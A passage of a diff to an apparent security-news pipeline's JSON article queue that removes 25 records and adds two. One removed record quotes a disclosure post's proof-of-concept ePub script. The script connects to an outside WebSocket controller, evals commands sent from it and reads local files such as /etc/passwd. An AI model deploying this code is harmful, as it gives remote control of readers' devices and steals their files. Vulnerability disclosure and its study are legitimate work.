@@ -1,316 +1,53 @@
 {
-  "filtered_at": "2026-05-20T11:43:44.361494+00:00",
+  "filtered_at": "2026-06-04T08:00:15.257123+00:00",
   "stats": {
-    "total_in_file": 932,
-    "total_inputs": 200,
-    "keyword_dropped": 175,
-    "passed_keywords": 25,
+    "total_in_file": 45,
+    "total_inputs": 45,
+    "keyword_dropped": 41,
+    "passed_keywords": 4,
     "cve_patch_dropped": 0,
-    "survived_cve_patch_filter": 25,
-    "gemma_rejected": 0,
-    "confirmed_gemma": 25,
-    "final_queue_size": 25
+    "survived_cve_patch_filter": 4,
+    "gemma_rejected": 2,
+    "confirmed_gemma": 2,
+    "min_confidence_score": 6,
+    "existing_loaded": 0,
+    "new_confirmed_this_run": 2,
+    "merged_before_cap": 2,
+    "trimmed_count": 0,
+    "max_queue_size": 50,
+    "confirmed_gemma_this_run": 2,
+    "final_queue_size": 2
   },
-  "article_count": 25,
+  "article_count": 2,
   "articles": [
     {
-      "source": "Signal Chaos",
-      "title": "This book reads you - using JavaScript",
-      "url": "http://s1gnalcha0s.github.io/ibooks/epub/2017/03/27/This-book-reads-you-using-JavaScript.html",
-      "content": "“Yes, books are dangerous. They should be dangerous - they contain ideas.” - Pete Hautman On a previous post about ePub parsers ( This book reads you - exploiting services and readers that support the ePub book format ), I mentioned using scripting capabilities in ePub to perform local attacks against users. Apple just released a fix for one issue I reported last year in iBooks that allowed access to files on a users system when a book was opened. iBooks on El Capitan would open an ePub using the file:// origin, which would allow an attacker to access the users file system when they opened a book. ( CVE-2017-2426 ) To help demonstrate how this could be used to perform attacks against users, I added a WebSocket client to a book, so that all users who open the book will connect back to a WebSocket controller server that will feed them arbitrary instructions. The WebSocket client in the ePub will allow access as long as the user has the book open (expectation is that it could be open for a long time, if the user is provided with something worth reading). eg., Sending a book to a user: iBooks connects to the WebSocket Controller when opening the book: iBooks connecting back to a WebSockets Controller. Local files can be retrieved if the reader is vulnerable to CVE-2017-2426 (file:// origin): Video demo of how this works (trying to type with one hand): This is the POC book if you want to try it yourself. You can open it in a reader like Apple iBooks or Adobe Digital Editions. Disclaimer: The POC connects to my controller, but I promise not to do anything bad. 😉 To modify it to point to your own controller: curl https://s1gnalcha0s.github.io/assets/controller/POC.epub -o poc.epub unzip poc.epub; rm poc.epub eg., contents of poc.epub/EPUB/js/main.js WebSocketController = ' ws://websocket-controller.herokuapp.com:80 ' ; var socket = new WebSocket ( WebSocketController , ' echo-protocol ' ); socket . onopen = function ( evt ) { onopen () }; socket . onmessage = function ( msg ) { onmessage ( msg ) }; socket . onclose = function ( evt ) { onerror () } function onopen () { message ( ' Connected to WebSocket Controller: ' + WebSocketController ); } function onerror () { message ( ' Unable to connect to WebSocket Controller: ' + WebSocketController ); } function onmessage ( msg ) { //just eval anything sent from the controller response = eval ( msg . data ); //send response back to controller socket . send ( response ); } function get ( loc ) { var xmlhttp = new XMLHttpRequest (); xmlhttp . open ( ' GET ' , ' file:// ' + loc , false ); xmlhttp . send (); //populate the message element message ( xmlhttp . responseText ); return xmlhttp . responseText ; } function message ( message ) { document . getElementById ( \" message \" ). innerText = message ; return message ; } function showExfil () { get ( ' /etc/passwd ' ); } zip -r poc.epub * Node.js WebSocket Controller: curl https://s1gnalcha0s.github.io/assets/controller/server.js -o server.js npm install websocket node server.js Disclosure timeline stuff: Dec 2016: Reported to Apple. Mar 2017: Fix release, and this post. Shoutouts: @shhnjk reported CVE-2017-2426 as well around the same time 👍. @mccabe615 ran a POC to help me confirm some issues independently. Thanks for reading. 👋 @craig",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
+      "source": "UpGuard Data Breach Research",
+      "title": "Breaking Confinement: How a Corrections Vendor Exposed Inmate Communications  | UpGuard",
+      "url": "https://www.upguard.com/breaches/breaking-containment-how-a-corrections-vendor-exposed-inmate-communications",
+      "content": "An exposed Azure storage bucket contained millions of documents sent through a jail messaging app, including driver's licenses used for identity verification.",
+      "published_at": "2026-06-01T20:11:12+00:00",
+      "timestamp": "2026-06-01T20:11:12+00:00",
       "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
+        "is_relevant": true,
+        "confidence_score": 9,
+        "primary_domain": "Identity",
+        "primary_platform": "Azure",
+        "reasoning_summary": "The text explicitly mentions an exposed Azure storage bucket containing millions of documents, including driver's licenses used for identity verification."
       }
     },
     {
-      "source": "Hacking Articles",
-      "title": "Active Directory Exploitation with Metasploit",
-      "url": "https://www.hackingarticles.in/active-directory-exploitation-with-metasploit/",
-      "content": "The walkthrough covers thirteen distinct attack phases: AD CS template reconnaissance, LDAP enumeration, Kerberos weakness discovery, credential extraction, SAMR account manipulation, Resource-Based Constrained Delegation abuse, The post Active Directory Exploitation with Metasploit appeared first on Hacking Articles .",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
+      "source": "Daily CyberSecurity",
+      "title": "Inside the GREYVIBE Threat Actor Group: A Hybrid Espionage Menace",
+      "url": "https://securityonline.info/greyvibe-threat-actor-group-russia-nexus/",
+      "content": "WithSecure recently exposed an active cyber espionage operation targeting Eastern Europe. Specifically, the GREYVIBE threat actor group actively The post Inside the GREYVIBE Threat Actor Group: A Hybrid Espionage Menace appeared first on Daily CyberSecurity . Related posts: The Invisible Trap: GenAI Now Creates “Living” Polymorphic Phishing Pages Phishing Alert: Fake WeTransfer & HunCERT Pages Hosted on AWS S3 & Cloudflare Turnstile Stealing Credentials Mimo Strikes Magento: New Campaign Shifts to Cryptojacking, Proxyjacking, & Stealthy Persistence",
+      "published_at": "2026-06-03T07:05:43+00:00",
+      "timestamp": "2026-06-03T07:05:43+00:00",
       "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Hacking Articles",
-      "title": "Active Directory User Enumeration: A Comprehensive Guide",
-      "url": "https://www.hackingarticles.in/active-directory-user-enumeration-a-comprehensive-guide/",
-      "content": "This article walks through sixteen distinct techniques for enumerating users inside Active Directory, drawing on the full spectrum of protocols an attacker can reach the The post Active Directory User Enumeration: A Comprehensive Guide appeared first on Hacking Articles .",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Hacking Articles",
-      "title": "Blue Teaming Active Directory: EVENmonitor",
-      "url": "https://www.hackingarticles.in/blue-teaming-active-directory-evenmonitor/",
-      "content": "This article demonstrates how EVENmonitor exposes the most common Active Directory attacks the moment they occur. Each attack is paired with the specific Windows Event The post Blue Teaming Active Directory: EVENmonitor appeared first on Hacking Articles .",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Hacking Articles",
-      "title": "AWS CloudGoat EC2 SSRF Exploitation",
-      "url": "https://www.hackingarticles.in/aws-cloudgoat-ec2-ssrf-exploitation/",
-      "content": "Cloud environments are increasingly targeted due to misconfigurations rather than software vulnerabilities. One such commonly exploited issue is Server-Side Request Forgery (SSRF), especially when cloud The post AWS CloudGoat EC2 SSRF Exploitation appeared first on Hacking Articles .",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Hacking Articles",
-      "title": "Active Directory Lab Setup for Penetration Testing Using PowerShell",
-      "url": "https://www.hackingarticles.in/active-directory-lab-setup-for-penetration-testing-using-powershell/",
-      "content": "This article provides a complete walkthrough of both phases — from clicking “Create a New Virtual Machine” in VMware all the way to a fully The post Active Directory Lab Setup for Penetration Testing Using PowerShell appeared first on Hacking Articles .",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Posts on Made of Bugs",
-      "title": "Distributed cloud builds for everyone",
-      "url": "https://blog.nelhage.com/post/distributed-builds-for-everyone/",
-      "content": "CPU cycles are cheaper than they have ever been, and cloud computing has never been more ubiquitous. All the major cloud providers offer generous free tiers, and services like GitHub Actions offer free compute resources to open-source repositories. So why do so many developers still build software on their laptops? Despite the embarrassment of riches of cheap or even free cloud compute, most projects I know of, and most developers, still do most of their software development — building and running code — directly on their local machines.",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Posts on Made of Bugs",
-      "title": "Some opinionated thoughts on SQL databases",
-      "url": "https://blog.nelhage.com/post/some-opinionated-sql-takes/",
-      "content": "People who work with me tend to realize that I have Opinions about databases, and SQL databases in particular. Last week, I wrote about a Postgres debugging story and tweeted about AWS’ policy ban on internal use of SQL databases, and had occasion to discuss and debate some of those feelings on Twitter; this article is an attempt to write up more of them into a single place I can refer to.",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Posts on Made of Bugs",
-      "title": "Running Tensorflow on AWS GPUs",
-      "url": "https://blog.nelhage.com/post/tensorflow-on-aws/",
-      "content": "I’ve been spending some time learning deep learning and tensorflow recently, and as part of that project I wanted to be able to train models using GPUs on EC2. This post contains some notes on what it took to get that working. As many people have commented, the environment setup is often the hardest part of getting a deep learning setup going, so hopefully this will be useful reference to someone.",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Posts on Made of Bugs",
-      "title": "Thoughts On Kubernetes",
-      "url": "https://blog.nelhage.com/post/kubernetes/",
-      "content": "I spent a while the last week porting livegrep.com from running directly AWS to running on Kubernetes on Google’s Cloud Platform (specifically, the google container engine, which provisions and manages the cluster for me). I left this experience profoundly enthusiastic about the future of Kubernetes. I think that if Google can execute properly, it’s clearly the future for how we build distributed applications. That said, it also feels like it has a ways to go yet.",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Electrospaces.net",
-      "title": "The NSA's new organizational designators",
-      "url": "https://www.electrospaces.net/2023/10/the-nsas-new-organizational-designators.html",
-      "content": "(Updated: September 20, 2025) For decades, the organizational structure of the NSA was classified, but since 2013 the Snowden documents provided hundreds of designators of internal divisions, branches and units, which allowed me to reconstruct the agency's internal structure . From 2016 to 2017, the NSA was reorganized so that many of those designators may have changed. Some recent documents, however, provide designators from the current situation, which allows to start a reconstruction of the new structure as well. The Integrated Cyber Center (ICC) and other new buildings at the NSA's East Campus (photo: Brendan Smialowski/Getty Images) The reorganization of 2016 The organizational structure of the NSA as it emerged from the Snowden documents was established in the year 2000 under director Michael Hayden. In 2016, director Michael Rogers initiated a full reorganization under the name NSA21 , in order to prepare the agency for the cyber challenges of the 21st century. One of the most important (and controversial ) changes was fusing the operational elements of the Signals Intelligence (SID) and Information Assurance (IAD) directorates into the new Directorate of Operations. The remaining information assurance activities were merged with the old Technology Directorate into the new Capabilities Directorate. The hacking group Tailored Access Operations (TAO) was renamed into Computer Network Operations (CNO). The new structure as envisioned by NSA21 reached full operational capability in December 2017. The new structure of the NSA as established by the NSA21 reorganization (source: NSA - click to enlarge) On October 1, 2019, an additional Cybersecurity Directorate (CSD) was established to unify the NSA's foreign intelligence and cyber defense missions and to prevent and eradicate threats to National Security Systems (NSS) and the Defense Industrial Base (DIB). The CSD pulled its workforce from several directorates, including the Operations Directorate and its Computer Network Operations group. The new organizational structure A number of new designators from the NSA's current structure can be found in the extensive NSA/CSS Policy 12-3 Annex C from June 2023. Some other documents and press reports provide additional information, which results in the partial chart below. Update: The NSA/CSS Civil Liberties and Privacy Program from November 2021 provides the internal top-level designators for all the agency's current directorates. The organization chart and the remarks below have been updated accordingly: A: Workforce Support Activities (WSA) A1: ? A2: National Cryptologic School (NCS) B: Business Management and Acquisition (BM&A) C: Cybersecurity Directorate (CSD) C5: Cybersecurity Collaboration Center (CCC) * C5.: Artificial Intelligence Security Center (AISC) D: Office of the Director DC: NSA/CSS Chief of Staff (CoS) ... D2: Office of General Counsel (OGC) ... D5: Civil Liberties, Privacy, and Transparancy (CLPT) D6: Diversity, Equality, and Inclusion (DEI) ... D9: Risk Management Office (RMO) I: Office of the Inspector General (OIG) P: Engagement and Policy (E&P) P1: ? P12: Office of Policy P13: ? P131: Information Security/Classification * ... P6: Mission Engagement & Assessments (MERA) P615: IBSSO Watch P7: Office of Compliance/Compliance Group P75: Office of Compliance for Cybersecurity and Operations R: Research Directorate X: Operations Directorate X3: Information and Intelligence Analysis (IIA) X30: ? X303: Defense Special Missile & Aerospace Center (DEFSMAC) X31: Eurasia & Western Hemisphere (EWH) X311: Russia division X3112: Military force projection X31122: Strategic Forces X311223: Strategic Navy X3112231: Watch ops X32: East Asia & Pacific (EAP) X33: Near East, South & Central Asia and Africa (NESCAA) X34: Counterterrorism (CT) X35: Counter-intelligence & Cyber (CIC) X36: Global Issues (GI) X4: Collection, Exploitation and Cryptoanalysis Operations X40: ? X41: ? X42: Sensor and Data Operations (SDO) X42?: High Capacity Sensor Operations (HCSO) X42?: Tailored Sensor Operations (TSO) X42?: MUSKETEER X42?: MINUTEMAN X43: Computer Network Operations (CNO) X44: Cryptoanalysis and Signals Analysis (CASA) X??: Access Discovery and Analysis X???: Radio Frequency Analysis Center (RFAC) X???: FORNSAT Discovery and Development (FDD) X???: Unidentified Signals and Support Branch X??: Digital Communications Analysis and Techniques X???: Advanced Protocol Analysis X???: Cyber Discovery X???: DRAGON RF Exploitation X???: High Capacity Discovery and Analysis Y: Capabilities Directorate - Chief Information Officer (CIO) Y1: ? Y1D: Collection and CNO Capabilities Y1D5: Orchestration Solutions (OS) Y1D511: CNO Infrastructure Operations Center Y1D515: CNO Security Operation Center Y1D5313: Defense Platform Solutions Y2: ? Y3: ? Y4: ? Y4D: Enterprise Infrastructure Services Y4D1: User Facing services Y4D12: Directory service Y4D121: Active directory Y4D122: Enterprise Defense services Y4D14: Desktop services Y4D142: Deployment services Y4D2: Network services Y4D23: Special Expeditionary IT Y4D231: OCO Communication support service Y4D232: Tactical services Y4D24: ? Y4D242: IC Legacy Messaging Desk Y4D3: ? Y4D4: Data Center services Y4D43: System management services Y4D5: Operations Support Y4D54: Capabilities Service Center Global Event Manager Some additional remarks (updated) If we compare these current designators with the structure before 2016, we see that: - The Office of the Director is still designated as \"D\" and may not have changed much, except for the Office of the Inspector General, which now has its own top-level designator (I), and at least two parts (the Office of Policy and the information security units) which have been transferred to the newly created Engagement & Policy Directorate (P). - For the Inspector General (IG) this reflects that since the FY2014 Intelligence Authorization Act this official is appointed by the President and confirmed by the Senate. Previously, the IG was appointed by the Director of the NSA, who could also remove him. The first presidentially appointed NSA IG was Rob Storch, who served from 2018 to 2022. - The position of the Chief Information Officer (CIO) is different: in 2020, the IG criticised that the CIO wasn't included in the organization charts of the agency and primarily served as head of one of the NSA's directorates, first Technology and now Capabilities. - Other new directorates also got a top-level designator that wasn't used before 2016: Workforce Support Activities (A), Business Management and Acquisition (B), Cybersecurity (C) and Capabilities (Y). The Research Directorate however kept the letter R. - The new Operations Directorate is designated by the letter X, which was already used under the old structure, although we don't know for what kind of activity. Maybe the previous X division was just temporary or very small as the only source that mentions it is a document about cable installations at NSA headquarters from 2007. > See also: The NSA's regional Cryptologic Centers Links - NextGov: A leadership vacuum and staff cuts threaten NSA morale, operational strength (November 4, 2025)",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Electrospaces.net",
-      "title": "On the 10th anniversary of the Snowden revelations",
-      "url": "https://www.electrospaces.net/2023/06/on-10th-anniversary-of-snowden.html",
-      "content": "(Updated: April 7, 2025) To mark the 10-year anniversary of the start of the Snowden revelations I will look back at some of the most notable disclosures and how they developed, based upon the most recent books and the numerous blog posts I have written here. Still, it should be noted that this overview is not a complete coverage of this wide-ranging topic. Books and archives Incentives The documents Non-Snowden leaks The Section 215 program The PRISM program Overcollection The Mission List Spying among friends Backdoor tapping Google BOUNDLESSINFORMANT Truth Conclusion Books and archives Incentives The documents Non-Snowden leaks Section 215 PRISM Overcollection The Mission List Spying among friends Backdoor tapping BOUNDLESSINFORMANT Truth Conclusion Books and archives Between June 2013 and May 2019, the Snowden revelations resulted in over 200 press reports and more than 1200 classified documents published in full or in part. Additionally, The Intercept published 2148 editions of the NSA's internal newsletter SIDtoday . In total, that may be well over 5000 pages. A collection that allows a useful visual recognition of the documents was found on the private website IC Off the Record , while text searches are possible at the Snowden Archive which is a collaboration between Canadian Journalists for Free Expression (CJFE) and the University of Toronto. A private collection of the documents is also available at GitHub . Update: The Snowden documents are also available on the website of the Dutch transparancy organization Buro Jansen & Janssen: as a list of NSA files and with a search interface . There are also at least 12 books about the Snowden revelations . Glenn Greenwald's No Place To Hide from 2014 reads like a pamphlet against perceived mass surveillance. A much more factual overview can be found in Der NSA Komplex , which is also published in 2014 and written by two journalists from Der Spiegel, but unfortunately only available in German. Detailed insights into the political and legal background of the NSA's collection programs are provided in Timothy Edgar's Beyond Snowden from 2017, which is in contrast to Snowden's own memoir Permanent Record from 2019, which leaves more questions than answers. Finally, there's also the long-awaited book Dark Mirror by Washington Post journalist Barton Gellman, which was published in 2020 and offers some important new angles to the initial stories told by Snowden and Greenwald. > See also my review of Permanent Record: Part I: at the CIA - Part II: at the NSA Incentives Some people assume that Snowden is a spy who worked for Russian intelligence, but nowadays, requests for information come from transparency activists as well. Wikileaks' wiki-page titled The Most Wanted Leaks of 2009 may have inspired Manning to search for information on SIPRNet and to download hundreds of thousands of military and diplomatic reports. Likewise, the incentive for Snowden may have come from the news program Democracy Now! , in which on April 20, 2012, former NSA crypto-mathematician Bill Binney, documentary filmmaker Laura Poitras and hacktivist Jacob Appelbaum were interviewed by Amy Goodman (a full transcript can be found here ). In the program, Binney claimed that after 9/11 \"all the wraps came off for NSA, and they decided to eliminate the protections on U.S. citizens and collect on domestically\". Appelbaum repeated what he said at the HOPE conference in 2010: \"I feel that people like Bill need to come forward to talk about what the U.S. government is doing, so that we can make informed choices as a democracy\" - which is exactly what Snowden would do: leaking documents because \" the public needs to decide whether these programs and policies are right or wrong.\" Later that day, Binney and Appelbaum spoke at a \"Surveillance Teach-In\" in the Whitney Museum, where Appelbaum emphasized that disclosing secret information is also important for privacy and civil liberties organizations: because of a lack of hard evidence and concrete harm it was almost impossible for them to fight NSA surveillance in court. Binney and Appelbaum at the Surveillance Teach-In on April 20, 2012 Whistleblowing? Just a month earlier, Snowden had started a new job as a SharePoint systems administrator at the NSA's regional cryptologic center in the Kunia Tunnel complex in Hawaii. There, he began automating his tasks to free up time for something more interesting, which he describes in Permanent Record : \"I want to emphasize this: my active searching out of NSA abuses began not with the copying of documents, but with the reading of them. My initial intention was just to confirm the suspicions that I'd first had back in 2009 in Tokyo. Three years later I was determined to find out if an American system of mass surveillance existed and, if it did, how it functioned.\" * With this, Snowden basically admits that he isn't a whistleblower: he wasn't confronted with illegal activities or significant abuses and subsequently secured evidence of that, but acted the other way around, by first gathering as much information he could get and then look whether there was something incriminating in it. In his memoir, Snowden doesn't come up with concrete misconducts or other things that could have triggered his decision to hand the files over to journalists. He even omits almost all the disclosures made by the press, which makes that Permanent Record contains hardly anything that justifies his unprecedented data theft. The tunnel entrance to the former Kunia Regional Security Operations Center in Hawaii, where Snowden worked from March 2012 to March 2013 (photo: NSA - click to enlarge) The documents The actual number of documents which Snowden eventually exfiltrated from the NSA has never been clarified. According to the 2016 report from the US House Intelligence Committee, Snowden removed more than 1.5 million documents from NSANet and the JWICS intelligence network. Glenn Greenwald repeatedly said that number was \"pure fabrication\" and he could probably agree with former NSA director Keith Alexander who in November 2013 estimated that Snowden had exposed only between 50,000 and 200,000 documents. * According to Barton Gellman, Snowden provided him and Laura Poitras with an encrypted archive of documents called \"Pandora\" on May 21, 2013. This archive was 8 gigabytes and contained over 50,000 separate documents, all neatly organized in folders. * Poitras gave Greenwald a copy of the Pandora archive just before they boarded their flight to Hong Kong on June 1. There, Snowden gave Ewen MacAskill from The Guardian some 50,000 documents about GCHQ and handed over all the remaining files to Greenwald and Poitras, who are the only ones with a complete set. Other media outlets only got partial sets of documents. Greenwald's cache eventually ended up at The Intercept , the online news outlet he co-founded with Jeremy Scahill and Laura Poitras in 2014 to report about the Snowden documents. In March 2019, however, The Intercept closed its Snowden archive and reportedly destroyed it. > See also: The Snowden files: where are they and where should they end up? Screenshot from a Brazilian television report, showing some of the Snowden files opened in a TrueCrypt window on the laptop of Glenn Greenwald. (screenshot by koenrh - click to enlarge) Non-Snowden leaks In a message to Gellman, Snowden said that \"he was not resigned to life in prison or worse. He wanted to show other whistleblowers that there could be a happy ending\". * Later, whistleblower attorney Jesselyn Radack hoped that \"courage is contagious, and we see more and more people from the NSA coming through our door after Snowden made these revelations.\" And indeed, other sources started to leak documents to the press. The first one was a so-called tasking record showing that the NSA had targeted the non-secure cell phone of German chancellor Angela Merkel. This was revealed by Der Spiegel on October 23, 2013, which is less than five months after the start of Snowden's revelations. > See also: Update on tapping German chancellor Merkel's phone The second leaked document that wasn't attributed to Snowden was just as spectacular: the ANT product catalog with a range of sophisticated spying gadgets from the NSA's hacking division TAO. This catalog was also published by Der Spiegel and discussed by Jacob Appelbaum during the CCC on December 30, 2013. Initially, hardly anyone noticed that these documents didn't come from Snowden, and so a mysterious \"second source\" was able to publish files that were sometimes even more embarrassing and damaging than those from the Snowden trove, like intercepted conversations from foreign government leaders. Later, other piggybackers who called themselves The Shadow Brokers leaked highly sensitive information about NSA hacking tools. The sources of these leaks have never been identified, although it's often assumed that Russian intelligence was behind it. Snowden never addressed these other leaks, nor distanced himself from them. > See also: Leaked documents that were not attributed to Snowden NSA report about an intercepted conversation of French president Hollande. Leaked by an unknown source and published by Wikileaks in 2015 (click to enlarge) The Section 215 program The very first disclosure of a document that did come from Snowden was the Verizon order of the Foreign Intelligence Surveillance Court (FISC). This court convenes behind closed doors and is often, but injustly referred to as a \"rubber stamp\". The order was published by The Guardian on June 6, 2013. The Verizon order showed that the NSA was collecting domestic telephone metadata under the so-called Section 215 program. In the US, this became the most controversial issue and initially it seemed to confirm cryptic public warnings by US senators Ron Wyden and Mark Udall, as well as the aforementioned claims by Bill Binney about domestic mass surveillance. In reaction, Director of National Intelligence (DNI) James Clapper started an unprecedented declassification effort and released numerous FISC and NSA documents about the Section 215 program on a newly created Tumblr site called IC On the Record . Misunderstanding This was meant to clarify a central misunderstanding: the fact that the NSA collects data inside the US doesn't mean they are spying on Americans. The NSA is still focused on foreign targets, but because they are using American internet services, it proved to be fruitful to intercept their data not only abroad, but at telecoms and internet companies inside the US as well (the \"home field advantage\"). Accordingly, the purpose of the Section 215 program was to find out whether foreign terrorists were in contact with unknown conspirators inside the US, which was one of the failures that could have prevented the attacks of 9/11. Therefore, the only thing the domestic telephone records were used for was simple contact chaining: NSA started with a phone number of a foreign terrorist and then the MAINWAY system presented the (foreign and domestic) phone numbers with which that initial number had been in contact with, as well as the numbers they, in their turn had been in contact with, the so-called \"second hop\": Explanation: How NSA contact chaining combines domestic and foreign phone records In 2012, the NSA used 288 phone numbers as a \"seed\" for such a contact chaining query, resulting in 6000 phone numbers that analysts actually looked at. When this led to a suspicious American phone number, the NSA passed it on to the FBI for further investigation. This true purpose of the domestic metadata collection was clearly laid out in a public report which the independent Privacy and Civil Liberties Oversight Board (PCLOB) published in January 2014. The PCLOB found \"no instance in which the program directly contributed to the discovery of a previously unknown terrorist plot\", but Section 215 was of some value as it offered additional leads and could show that foreign terrorist plots had no US nexus. Although these domestic telephone records were not used to spy on Americans, and the FISC limited their retention to 5 years and prohibited the collection of location data, many people would not like to have them in an NSA database because of what Binney and Snowden called the possibility of a \"turnkey tyranny\". * The publication of the Verizon order did not only make the general public aware of the Section 215 program, but also gave civil liberty organizations standing in court, which fulfilled Jacob Appelbaum's wish from the 2012 Surveillance Teach-In. Meanwhile there have been two cases in which a Circuit Court of Appeals ruled about the Section 215 program. They both found that the bulk collection of metadata exceeded the scope of Section 215 of the Patriot Act (because the actual practice hadn't been foreseen by lawmakers, although they had been briefed about it later). The courts didn't decide on whether the program was constitutional or not. > See also: About the legality and constitutionality of the Section 215 metadata program The first page of the Verizon order from April 25, 2013 (click for the full document) The PRISM program One day after the publication of the Verizon order, The Guardian and The Washington Post revealed the PRISM program, which became synonymous for an all encompassing NSA spying system, just like ECHELON was before. In his book Dark Mirror , Barton Gellman tells a different story than Greenwald did in No Place to Hide . Greenwald presented himself as the one who was chosen by Snowden to lead the revelations and claimed that he and Laura Poitras were working with Snowden since February 2013, while Gellman only got \"some documents\" and that Snowden was angry about the fear-driven approach of The Washington Post. * According to Gellman, the opposite was the case: on January 31, 2013, Laura Poitras already asked him for advice and on May 7, they agreed to work together. She introduced Gellman to her source, who still called himself Verax, and they started encrypted chat conversations. On May 20, Snowden sent them the full PRISM presentation, after which they signed a contract with The Washington Post on May 24. * But Snowden was under severe time pressure and urged Gellman to rapidly publish the full PRISM presentation, which he had signed with a digital signature associated with his Verax alter ego. Only gradually did Gellman realize the implications of this. Snowden's plan was to ask political asylum at a foreign diplomatic mission in Hong Kong, where he wanted to use the cryptographic signature to identify himself as the source of the PRISM document (and didn't rule out to \"provide raw source material to a foreign government\"). * As a journalist, Gellman protected the identity of his source, but publishing the digitally signed PRISM presentation would make him and The Washington Post complicit in Snowden's flight from American law. After consulting Poitras, Gellman decided not to do so. On May 27, Snowden withdrew the exclusive right for the Washington Post and turned to Greenwald, who until that moment didn't know who Snowden was, nor had seen any of the documents. * When Greenwald finally managed to get PGP working, Snowden sent him a zip-file with some 25 documents, including the 41-slide PRISM presentation. Greenwald started writing his own story about PRISM, which was published by The Guardian on June 6, 2013. * Just one hour earlier, The Washington Post had released its own PRISM story. The most controversial part of these stories was the claim that \"the National Security Agency has obtained direct access to the systems of Google, Facebook, Apple and other US internet giants\", which those companies vigorously denied. That \"direct access\" was taken from one of the slides, but it's unclear why both Gellman and Greenwald stuck to the most simple interpretation of it. Fact is that they had access to the extensive accompanying speaker's notes, which clearly said: \"PRISM access is 100% dependent on ISP provisioning\". * They also had all the other PRISM slides, including two that were published later on, which also show that the FBI is in between the NSA and the internet companies: PRISM-slide published by Le Monde on October 22, 2013 In July 2014, the Privacy and Civil Liberties Oversight Board (PCLOB) published an extensive public report about PRISM as well, which confirms that individual selectors (like a target's e-mail address) are sent to internet companies, which are \"compelled to give the communications sent to or from that selector to the government.\" According to the report, PRISM \"has proven valuable in the government’s efforts to combat terrorism as well as in other areas of foreign intelligence.\" > See also: What is known about NSA's PRISM program In Dark Mirror , Gellman admits: \"In retrospect, I do not love the way I wrote the [PRISM] story. I knew a lot less then than I learned later, with more time in the documents and many more interviews\". A well-informed source told him that the systems of a company like Facebook are too complex to let the NSA plug in a cable. Only Facebook knows how to pull things out, which they can then hand over upon a valid request. * Google did that through secure FTP transfers and in person. Another interesting addition provided by Gellman is about the date of the PRISM presentation, April 2013, which is less than one and a half months before Snowden left the NSA: \"Nothing Snowden had seen until now better suited his plan. He had been talking to Poitras for three months, but he still did not feel confident that his disclosures would seize attention from a public that had seldom responded strongly to privacy warnings. Most of the NSA programs that worried him were legally and technically intricate, not easy to explain. He needed examples that ordinary people would recognize. Along came [the PRISM] presentation, festooned at the top of every slide with iconic logos from the best-known Internet companies in the world. \"PRISM hits close to people's hearts\", he told me.\" * Overcollection While PRISM is no mass surveillance, but targeted collection against individual foreign targets, it still has a problematic aspect: overcollection. Snowden was eager to draw public attention to this issue and, according to Greenwald, took his last job at NSA Hawaii only in order to get access to the NSA's raw data repositories. * Snowden declined to repeat or explain that to Gellman though. * He succeeded and was able to exfiltrate a cache of ca. 22,000 collection reports, containing 160,000 individual conversations (75% of which instant messages), which the NSA collected via the PRISM program between 2009 and 2012. * Snowden handed them over to Barton Gellman who reported about these files in July 2014. Researchers at The Washington Post found that the intercepted communications contained valuable foreign intelligence information, but also that over 9 out of 10 accountholders were not the intended surveillance targets and that nearly half of the files contained US person identifiers. It's probably technically impossible to prevent such overcollection, but instead of deleting irrelevant personal content, the NSA only \"minimizes\" it, which means that names of Americans are redacted before they are distributed. Gellman saw that NSA personnel takes these procedures seriously, but when he confronted former NSA deputy director Rick Ledgett with his unease, Ledgett's only reply was that the NSA really doesn't care about ordinary people. * > See also: Section 702 FAA expires: what are the problems with PRISM and Upstream? The Mission List Ledgett's answer is confirmed by a comprehensive listing of the tasks of the NSA in the Strategic Mission List from January 2007. It was published by The New York Times in November 2013, but got hardly any attention, despite the fact that it clearly contradicts the claims by Snowden and Greenwald that the NSA has just one single goal: collect all digital communications from all over the world. Equally less traction gained reports by Ewen MacAskill from The Guardian and Scott Shane from The New York Times, who tried to provide balance and nuance by showing that NSA and GCHQ also did many good things, like monitoring terrorists, the Taliban, hostage takers, human traffickers, and drug cartels. The Mission List says that China, North-Korea, Iraq, Iran, Russia and Venezuela were 